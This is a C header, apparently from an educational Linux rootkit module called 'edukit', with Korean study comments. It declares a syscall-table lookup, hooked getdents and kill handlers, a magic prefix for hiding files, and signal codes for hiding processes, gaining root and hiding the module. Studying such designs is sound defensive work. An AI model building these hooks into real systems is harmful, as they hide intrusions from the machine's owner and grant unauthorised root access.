unsigned long *get_syscall_table_bf(void);
static inline void tidy(void);
asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage int hacked_kill(pid_t pid, int sig);

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

// 커널 메모리의 시작주소라고 하는데 더 자료를 찾아봐야겠다.
#define START_MEM	PAGE_OFFSET
// long 자료형으로 접근할 수 있는 최대 바이트 수
#define END_MEM		ULONG_MAX

#define MAGIC_PREFIX "edukit_secret"

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "edukit"

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};
